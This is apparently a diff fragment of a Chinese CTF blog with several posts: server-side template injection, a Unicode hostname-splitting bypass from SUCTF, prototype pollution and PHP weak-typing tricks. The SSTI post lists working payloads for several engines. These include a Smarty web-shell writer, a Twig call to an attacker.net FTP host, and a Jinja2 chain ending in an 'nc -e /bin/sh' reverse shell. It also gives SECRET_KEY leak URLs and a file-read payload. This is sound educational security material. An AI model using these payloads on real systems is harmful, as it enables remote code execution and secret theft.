+<p>同时我们也知道我们有两种方式去访问对象的属性，当我们通过指定下标的方式去访问的时候，我们可以通过<code>b[&quot;__proto__&quot;]</code>的方式去访问其原型对象</p>
+<pre><code>a = []
+b = []
+b[&quot;__proto__&quot;][&quot;admintoken&quot;]=&quot;123456&quot;;
+a.admintoken
+&quot;123456&quot;</code></pre><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+
+        </div>
+    
+
 </div>
-<a class="" id="rocket" href="javascript:void(0)"></a>
-    </div>
-</div>
-<div class="acParent"></div>
+            
+                
+<div class="post">
 
-<div class="hide_box" onclick="dashangToggle()"></div>
-<div class="shang_box">
-    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
-    <div class="shang_tit">
-        <p>喜欢就点赞,疼爱就打赏</p>
-    </div>
-    <div class="shang_payimg">
-        <div class="pay_img">
-            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
-            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/30/SSTI/">
+                SSTI-服务器端模板注入
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-30</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/30/SSTI/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
         </div>
     </div>
-    <div class="shang_payselect">
-        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+
+    
+        <div class="content">
+            <h1 id="SSTI-服务器端模板注入"><a href="#SSTI-服务器端模板注入" class="headerlink" title="SSTI-服务器端模板注入"></a>SSTI-服务器端模板注入</h1><p>8/30/2019 3:28:13 PM </p>
+<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>使用PHP模板引擎Twig作例子演示注入原理</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&#39;/../lib/Twig/Autoloader.php&#39;;
+Twig_Autoloader::register(true);
+
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值
+echo $output;</code></pre><blockquote>
+<p>In this example the user controls the content of the template itself via the custom_email GET parameter, rather than a value passed into it. </p>
+</blockquote>
+<p><code></code>模板变量值作为参数来自于<code>GET</code>请求<code>$_GET[&quot;name&quot;]</code>。这段代码没什么问题。模板引擎默认会对渲染的变量值进行编码和转义，所以并不会造成<code>XSS</code>等。</p>
+<p>但是如果我们修改代码</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&#39;/../lib/Twig/Autoloader.php&#39;;
+Twig_Autoloader::register(true);
+
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {$_GET[&#39;name&#39;]}&quot;);  // 将用户输入作为模版内容的一部分
+echo $output;</code></pre><p>我们将<code>GET</code>的参数直接作为模板的内容，不再对其进行编码和转义了则很容易出现攻击点。于是我们知道漏洞的原因是服务器端相信了用户的输入。</p>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>如何判断是否存在<code>SSTI</code>？</p>
+<p>我们还以上面的代码为例：</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&#39;/../lib/Twig/Autoloader.php&#39;;
+Twig_Autoloader::register(true);
+
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {$_GET[&#39;name&#39;]}&quot;);  // 将用户输入作为模版内容的一部分
+echo $output;</code></pre><p>在Twing模板引擎里<code></code>不仅可以输出传递的变量外，还能执行一些基本的表达式然后将其作为模板变量的值。我们输入<code>name=20</code>,服务端得到内容为 <code>Hello 20</code>，会输出 <code>Hello 20</code>.</p>
+<p>我们现在修改数据为</p>
+<pre><code>IsVuln{{2*8}}OK</code></pre><p>服务器端收到内容为</p>
+<pre><code>Hello IsVuln{{2*8}}OK</code></pre><p>由于``作为Twing模板的默认注释形式，所以并不会被前端输出，而<code>2*8</code>则会被计算，最终输出</p>
+<pre><code>Hello IsVuln16OK</code></pre><p>得到扫描的大致流程为</p>
+<p><img src="http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png" alt="扫描流程(Twig)"></p>
+<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
+<h2 id="常用引擎"><a href="#常用引擎" class="headerlink" title="常用引擎"></a>常用引擎</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ol>
+<li>Smarty：<code>{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)}</code>、<code>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}</code></li>
+<li>Twig：<code>{{_self.env.setCache("ftp://attacker.net:2121")}}``{{_self.env.loadTemplate("backdoor")}}</code>、<code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></li>
+<li>Blade：</li>
+</ol>
+<h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><ol>
+<li>JSP</li>
+<li>FreeMarker：<code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) }</code></li>
+<li>Velocity</li>
+<li>Spring boot</li>
+</ol>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ol>
+<li>Jinja2：<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}</code><br> <code>//写文件</code> {{ config.from_pyfile('/tmp/evil') }}
+ //加载system {{ config['SHELL']('nc xxxx xx -e /bin/sh') }}
+ //执行命令反弹SHELL</li>
+<li>django：<code>http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}</code>、<code>http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></li>
+<li>tornado：<code>http://117.78.26.79:31093/error?msg={{handler.settings}}</code></li>
+</ol>
+<h2 id="如何判断引擎种类"><a href="#如何判断引擎种类" class="headerlink" title="如何判断引擎种类"></a>如何判断引擎种类</h2><p>这里参考james大神的文章</p>
+<blockquote>
+<p>Green and red arrows represent ‘success’ and ‘failure’ responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe {{7*'7'}} would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.</p>
+</blockquote>
+<p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="检测思路"></p>
+<h2 id="OGeak-ctf-Render"><a href="#OGeak-ctf-Render" class="headerlink" title="OGeak-ctf Render"></a>OGeak-ctf Render</h2><p>题目链接：<a href="http://47.107.244.251:18080/" title="点这里" target="_blank" rel="noopener">http://47.107.244.251:18080/</a></p>
+<p>查看后端代码</p>
+<pre><code>var app = new Vue({
+    el: &#39;#app&#39;,
+    data: {
+        content: &#39;&#39;,
+        result: &#39;&#39;
+    },
+    methods: {
+        request: function(event) {
+            var vm = this
+            axios.post(&#39;/render&#39;, {
+                content: vm.content
+            })
+                .then(function (response) {
+                    console.log(response)
+                    vm.result = response.data.result
+                })
+                .catch(function (error) {
+                    console.log(error)
+                    vm.result = error
+                })
+        }
+    }
+})</code></pre><p>将我们的输入值返回给<code>result</code>进行输出.这里似乎没用到什么模板语法，但是它仍然会将<code>post</code>的<code>content</code>用模板的方式去渲染。</p>
+<p>我们尝试常用的模板引擎语法测试</p>
+<p>最终</p>
+<pre><code>[[1+1]]</code></pre><p>被成功解析</p>
+<p>我们随便访问一个页面发现是Spring boot,既然是Java写的那我们就java读文件，语法参考<a href="https://dotblogs.com.tw/cylcode/2018/09/21/170510" title="这里" target="_blank" rel="noopener">https://dotblogs.com.tw/cylcode/2018/09/21/170510</a></p>
+<p>payload:</p>
+<pre><code>[[${new java.io.BufferedReader(new java.io.FileReader(&quot;/flag&quot;)).readLine()}]]</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p><a href="http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84</a><br><a href="https://portswigger.net/blog/server-side-template-injection#top" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection#top</a></p>
+</blockquote>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/22/HostSplit/">
+                HostSplit-Exploitable
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-22</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/22/HostSplit/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>8/22/2019 11:39:23 AM </p>
+<h1 id="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习"><a href="#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习" class="headerlink" title="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习"></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习</h1><h2 id="IDN-与-UTF-8"><a href="#IDN-与-UTF-8" class="headerlink" title="IDN 与 UTF-8"></a>IDN 与 UTF-8</h2><p><strong>IDN</strong></p>
+<blockquote>
+<p>国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域名。<br>科研人员又将纯数字表示的IP地址基础上推出更加便于记忆的字符型访问标识，即基于IP地址的域名系统。这些域名只能使用63个ASCII字符（”a-z”，”A-Z”，”0-9”，”-“）. 随着互联网在非英语国家的迅猛发展，九十年代末期国际互联网界提出了将原本只能使用63个ASCII字符的域名，采用本地语言文字来表示，也就是出现了对多语种域名的需求。</p>
+</blockquote>
+<p><a href="http://中国政府.政务/" target="_blank" rel="noopener">http://中国政府.政务/</a></p>
+<p>这是我国的政府网站！</p>
+<p><strong>UTF-8</strong></p>
+<blockquote>
+<p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码，由Ken Thompson于1992年创建，现在已经标准化为RFC 3629。UTF-8用1到4个字节编码Unicode字符。用在网页上可以统一页面显示中文简体繁体及其它语言.</p>
+</blockquote>
+<p>Puny 编码 (Punycode)</p>
+<blockquote>
+<p>这是一个简易而准确的IDN ASCII 编码系统 (ASCII-Compatible Encoding (ACE))。它能转换一系列的 字符编码成为字符以符合主机名称(hostname)标准 (ASCII 字母，数位和连字符号)。<br>例: xn–0zwm56d.test </p>
+</blockquote>
+<pre><code>中国.政府-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id="Unicode-➔-ASCII-–-A-Two-Step-Process"><a href="#Unicode-➔-ASCII-–-A-Two-Step-Process" class="headerlink" title="Unicode ➔ ASCII – A Two Step Process"></a>Unicode ➔ ASCII – A Two Step Process</h2><ol>
+<li>Normalization Convert characters to a “standardized form”.</li>
+<li>Punycoding Turn Unicode into ASCII.</li>
+</ol>
+<p>意思就是说IDN的使用底层还是ASCII的功劳。先转换成标准形式然后进行puny编码。</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg" alt="转换过程"></p>
+<h2 id="Splitting-Hostnames"><a href="#Splitting-Hostnames" class="headerlink" title="Splitting Hostnames"></a>Splitting Hostnames</h2><pre><code>https://evil.c℀.Example.com</code></pre><p>我们对他进行转换成ASCII会发生什么？</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg" alt="Normalizing "></p>
+<pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything – it’s all ASCII now!</strong>也就是不用再次编码已经可以解析了</p>
+<h2 id="python-utf-8-unicode-ascii互转"><a href="#python-utf-8-unicode-ascii互转" class="headerlink" title="python utf-8,unicode,ascii互转"></a>python utf-8,unicode,ascii互转</h2><p>unicode-&gt;ascii</p>
+<pre><code>&gt;&gt;&gt; ord(u&#39;脑&#39;)
+33041</code></pre><p>ascii-&gt;unicode</p>
+<pre><code>&gt;&gt;&gt; chr(33041)
+&#39;脑</code></pre><p>unicode &lt;=&gt; utf-8</p>
+<pre><code>&gt;&gt;&gt; n = u.encode(&#39;utf8&#39;)
+&gt;&gt;&gt; n
+b&#39;\xe5\xb1\x8c&#39;
+
+&gt;&gt;&gt; m = n.decode(&#39;utf8&#39;)</code></pre><p>注：linux默认编码为unicode，若为其他两种编码进行转换，需unicode作为“媒介</p>
+<h2 id="Python-was-vulnerable"><a href="#Python-was-vulnerable" class="headerlink" title="Python was vulnerable"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit 
+&gt;&gt;&gt; url = &#39;http://canada.c℀.microsoft.com/some.txt&#39; 
+&gt;&gt;&gt; parts = list(urlsplit(url)) 
+&gt;&gt;&gt; host = parts[1] 
+&gt;&gt;&gt; host &#39;canada.c℀.microsoft.com&#39; 
+&gt;&gt;&gt; newhost = [] 
+&gt;&gt;&gt; for h in host.split(&#39;.&#39;): 
+... newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)) 
+... 
+&gt;&gt;&gt; parts[1] = &#39;.&#39;.join(newhost) 
+&gt;&gt;&gt; finalUrl = urlunsplit(parts) 
+&gt;&gt;&gt; finalUrl 
+&#39;http://canada.ca/c.microsoft.com/some.txt&#39; </code></pre><h2 id="Python-had-an-extra-variant"><a href="#Python-had-an-extra-variant" class="headerlink" title="Python had an extra variant"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse 
+&gt;&gt;&gt; r=&#39;http://bing.com&#39;+u&#39;\uFF03&#39;+&#39;:password@products.office.com&#39; 
+&gt;&gt;&gt; o = urlparse(r) 
+&gt;&gt;&gt; o.hostname &#39;products.office.com&#39; 
+&gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) 
+&gt;&gt;&gt; a &#39;http://bing.com#:password@products.office.com&#39; 
+&gt;&gt;&gt; o = urlparse(a) 
+&gt;&gt;&gt; o.hostname 
+&#39;bing.com&#39;</code></pre><h2 id="SUCTF-PythonNginx"><a href="#SUCTF-PythonNginx" class="headerlink" title="SUCTF PythonNginx"></a>SUCTF PythonNginx</h2><p>SUCTF中的一道题：</p>
+<pre><code>    @app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def getUrl():
+    url = request.args.get(&quot;url&quot;)
+    host = parse.urlparse(url).hostname
+    if host == &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 111&quot;
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 222 &quot; + host
+    newhost = []
+    for h in host.split(&#39;.&#39;):
+        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+    parts[1] = &#39;.&#39;.join(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == &#39;suctf.cc&#39;:
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return &quot;我扌 your problem? 333&quot;</code></pre><p>爆破最后一位c</p>
+<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
+from urllib import parse
+def get_unicode():
+    for x in range(65536):
+        uni=chr(x)
+        url=&quot;http://suctf.c{}&quot;.format(uni)
+        try:
+            if getUrl(url):
+                print(&#39;11&#39;)
+                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])
+        except:
+            pass
+
+
+def getUrl(url):
+    url = url
+    host = parse.urlparse(url).hostname
+    if host == &#39;suctf.cc&#39;:
+        return False
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == &#39;suctf.cc&#39;:
+        return False
+    newhost = []
+    for h in host.split(&#39;.&#39;):
+        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+    parts[1] = &#39;.&#39;.join(newhost)
+    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == &#39;suctf.cc&#39;:
+        return True
+    else:
+        return False
+
+if __name__==&quot;__main__&quot;:
+    get_unicode()
+
+str: �G unicode: \u2105
+str: �� unicode: \uff23
+str: �� unicode: \uff43
+[Finished in 6.5s]</code></pre><p>我们看一下各个判断的结果</p>
+<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
+from urllib import parse
+url = &#39;http://canada.c℀.microsoft.com/some.txt&#39;
+parts = parse.urlparse(url)
+&gt;&gt;&gt; parts
+ParseResult(scheme=&#39;http&#39;, netloc=&#39;canada.c℀.microsoft.com&#39;, path=&#39;/some.txt&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+&gt;&gt;&gt; host = parts.hostname
+&gt;&gt;&gt; host
+&#39;canada.c℀.microsoft.com&#39;
+&gt;&gt;&gt; parts1 = list(urlsplit(url))
+&gt;&gt;&gt; parts1
+[&#39;http&#39;, &#39;canada.c℀.microsoft.com&#39;, &#39;/some.txt&#39;, &#39;&#39;, &#39;&#39;]</code></pre><p>可以看到已经可以绕过判断了</p>
+<h3 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交DNS域名解析服务器进行IP地址的解析。</p>
+<h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>中文意思：本地文件传输协议<br>什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。<br>如何使用File：要使用File协议，基本的格式如下：file:///文件路径，比如要打开F盘flash文件夹中的1.swf文件，那么可以在资源管理器或浏览器地址栏中输入：file:///f:/flash/1.swf回车。</p>
+<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p> Nginx的配置文件是一个纯文本文件，它一般位于Nginx安装目录的conf目录下，整个配置文件是以block的形式组织的。每个block一般以一个大括号“{”来表示。block 可以分为几个层次，整个配置文件中Main命令位于最高层，在Main层下面可以有Events、 HTTP等层级，而在HTTP层中又包含Server层，即server block, serverblock中又可分为location层，并且一个server block中可以包含多个location block。</p>
+<p>nginx配置文件路径</p>
+<pre><code>[root@localhost vhost]# locate nginx.conf
+/usr/local/nginx/conf/nginx.conf
+/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hosts文件绑定本地回环地址，尝试file读文件</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg" alt="尝试读文件"></p>
+<p>读nginx配置文件</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg" alt="读配置文件"></p>
+<p>读flag</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg" alt="读flag"></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/19/Black_magic/">
+                black_magic
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-19</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/19/Black_magic/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="php-弱类型总结"><a href="#php-弱类型总结" class="headerlink" title="php 弱类型总结"></a>php 弱类型总结</h1><h2 id="字符与数字的比较"><a href="#字符与数字的比较" class="headerlink" title="字符与数字的比较"></a>字符与数字的比较</h2><pre><code>&lt;?php
+
+$a=1;
+if($a=TRUE)
+    echo &quot;1111\n&quot;;
+if($a=&#39;a&#39;)
+    echo &quot;1111\n&quot;;
+
+结果
+1111
+1111</code></pre><p>联想到之前P神的文章，<code>TRUE+TRUE=2</code></p>
+<pre><code>$_=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);        //2
+echo $_;
+$__=$_/$_;                    //1</code></pre><p>来构造数字1和2</p>
+<h2 id="md5比较"><a href="#md5比较" class="headerlink" title="md5比较"></a>md5比较</h2><pre><code>&lt;?php
+error_reporting(0); 
+$flag = &#39;233&#39;;
+//highlight_file(__FILE__);  
+
+$md51 = md5(&#39;QNKCDZO&#39;);  //0e830400451993494058024219903391
+//$a = $_GET[&#39;b&#39;]; 
+$a = &#39;s878926199a&#39;;
+$md52 = md5($a); 
+if(isset($a)){ 
+if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) { 
+    echo $flag; 
+} else { 
+    echo &quot;false!!!&quot;; 
+    }
+}</code></pre><p>php在进行 <code>==</code> 比较的时候会认为该字符串是科学记数法表示的数字，<code>QNKCDZO</code> MD5值是<code>0e</code>开头，我们也找到一个MD5后<code>0e</code>开头的这样两个字符串都转换为数字0，这样就弱比较相等，但是如果是 <code>===</code> 就不行了。</p>
+<p> === 在进行比较的时候会判断两种字符串的类型是否相等再比较。</p>
+<p> == 在进行比较的时候会将字符串类型转换相同，再比较。如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。</p>
+<pre><code>var_dump(&#39;admin&#39;==0);
+var_dump(&#39;1admin&#39;==1);
+var_dump(&quot;admin1&quot;==1);
+var_dump(&quot;admin1&quot;==0);
+var_dump(&quot;0e123345&quot;==&quot;0e3455436&quot;);
+
+bool(true)
+bool(true)
+bool(false)
+bool(true)
+bool(true)</code></pre><p>例如<br>        <?php
+        $a=$_GET['a'];
+        if ($a==0) {
+        echo "1";
+        }
+        if ($a) {
+        echo "must";
+        }
+        ?></p>
+<p>我们传入<code>?a=a1</code>即可</p>
+<p>一些MD5后0e开头的例子</p>
+<pre><code>s878926199a
+0e545993274517709034328855841020
+s155964671a
+0e342768416822451524974117254469
+s214587387a
+0e848240448830537924465865611904
+s214587387a
+0e848240448830537924465865611904</code></pre><p>json-decode</p>
+<pre><code>&lt;?php
+if (isset($_POST[&#39;message&#39;])) {
+    $message = json_decode($_POST[&#39;message&#39;]);
+    $key =&quot;*********&quot;;
+    if ($message-&gt;key == $key) {
+        echo &quot;flag&quot;;
+        } 
+    else {
+        echo &quot;fail&quot;;
+        }
+     }
+     else{
+         echo &quot;~~~~&quot;;
+ }</code></pre><p>我们利用 0 = admin 的特性传入 <code>$message = {&quot;key&quot;:0}</code></p>
+<h2 id="当MD5与SHA1碰上数组"><a href="#当MD5与SHA1碰上数组" class="headerlink" title="当MD5与SHA1碰上数组"></a>当MD5与SHA1碰上数组</h2><pre><code>$a = [1];
+var_dump(MD5($a));
+var_dump(sha1($a));
+
+NULL
+NULL</code></pre><p>他俩碰到数组就会转换成<code>NULL</code></p>
+<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><pre><code>&lt;?php 
+var_dump(intval(&#39;2&#39;));            //2
+var_dump(intval(&#39;3abcd&#39;));        //3    
+var_dump(intval(&#39;abcd&#39;));        //0
+var_dump(intval([]));            //0    
+var_dump(intval([&#39;a&#39;]));        //1
+ ?&gt;</code></pre><p>利用intval()进行进制转换(默认是10进制)碰到头开始直到遇到一个非数字的字符。即使出现无法转换的字符串也不会报错而是返回0.碰到空数组返回0，非空返回1.</p>
+<p>可返回的最大值却决于操作系统，32 位系统最大带符号的 <code>integer</code> 范围是 <code>-2147483648</code> 到 <code>2147483647</code>。</p>
+<pre><code>var_dump(intval(&#39;10000000000000000&#39;));   //int(2147483647)</code></pre><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><blockquote>
+<p>strcmp — 二进制安全字符串比较<br>如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
+</blockquote>
+<pre><code>$password=$_GET[&#39;password&#39;];
+
+if(strcmp(&#39;am0s&#39;,$password)){
+    echo &#39;false!&#39;;
+}else{
+    echo &#39;success!&#39;;
+}</code></pre><p>我们传入<code>password[]=1</code>来绕过。</p>
+<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>当有两个<code>is_numeric</code>判断并用<code>and</code>连接时<code>and</code>后面的<code>is_numeric</code>可以绕过</p>
+<blockquote>
+<p>is_numeric — 检测变量是否为数字或数字字符串<br>如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE</p>
+</blockquote>
+<pre><code>var_dump(is_numeric(&#39; 45&#39;));   //bool(true)
+var_dump(is_numeric(&#39;45 &#39;));   //bool(false)</code></pre><p>忽略前面的空格，不忽略后面的空格。</p>
+<pre><code>$a=&#39; 1&#39;;
+$b=&#39;abc&#39;;
+$c=is_numeric($a) and is_numeric($b);
+var_dump(is_numeric($a));            //bool(true)
+var_dump(is_numeric($b));            //bool(false)
+var_dump($c);  //$b可以不是数字，同样返回true
+var_dump(is_numeric(&#39;123E123&#39;));    //bool(true) 小写也可以
+var_dump(is_numeric(&#39;+123e123&#39;));    //bool(true)    </code></pre><h2 id="与false比较"><a href="#与false比较" class="headerlink" title="与false比较"></a>与false比较</h2><pre><code>var_dump(null==false);        //bool(true)
+var_dump(0==false);            //bool(true)    
+var_dump(&#39;0&#39;==false);        //bool(true)
+$a[] = array(&#39; &#39; =&gt; &#39;&#39;,);
+var_dump($a[1] == false);        //bool(true)
+?&gt;</code></pre><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><blockquote>
+<p>ereg — 正则表达式匹配<br>以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。 如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。$regs[1] 包含第一个左圆括号开始的子串，$regs[2] 包含第二个子串，以此类推。$regs[0] 包含整个匹配的字符串。 </p>
+</blockquote>
+<p>字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。</p>
+<pre><code>$a = &quot;djasodja%0091&quot;;
+$b[] =  array(&#39;a&#39; =&gt; &#39;abcpd&#39;, );
+var_dump(ereg(&#39;([1-9])&#39;, $a));            //int(1)
+var_dump(ereg(&#39;pd&#39;, $b));                //NULL</code></pre><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><blockquote>
+<p>switch 语句类似于具有同一个表达式的一系列 if 语句。很多场合下需要把同一个变量（或表达式）与很多不同的值比较，并根据它等于哪个值来执行不同的代码。这正是 switch 语句的<br>用途.<br> 注意和其它语言不同，continue 语句作用到 switch 上的作用类似于 break。如果在循环中有一个 switch 并希望 continue 到外层循环中的下一轮循环，用 continue 2。<br> switch 语句一行接一行地执行（实际上是语句接语句）。开始时没有代码被执行。仅当一个 case 语句中的值和 switch 表达式的值匹配时 PHP 才开始执行语句，直到 switch 的程序段结束或者遇到第一个 break 语句为止。如果不在 case 的语句段最后写上 break 的话，PHP 将继续执行下一个 case 中的语句段.</p>
+</blockquote>
+<pre><code>&lt;?php
+switch (true) {    //弱类型
+    case 0:
+        echo &quot;0&quot;;
+        break;
+    case 1:
+        echo &quot;1&quot;;
+        break;
+    case 2:
+        echo &quot;2&quot;;
+        break;
+}
+//1
+?&gt;
+
+&lt;?php
+switch (0) {
+    case 0:
+        echo &quot;i equals 0&quot;;
+    case 1:
+        echo &quot;i equals 1&quot;;
+    case 2:
+        echo &quot;i equals 2&quot;;
+}
+//i equals 0    i equals 1    i equals 2
+?&gt; 
+
+&lt;?php
+
+switch (&#39;a&#39;) {  // null、false
+    case 0:
+        echo &quot;0&quot;;
+        break;
+    case 1:
+        echo &quot;1&quot;;
+        break;
+    case 2:
+        echo &quot;2&quot;;
+        break;
+}
+//输出 0
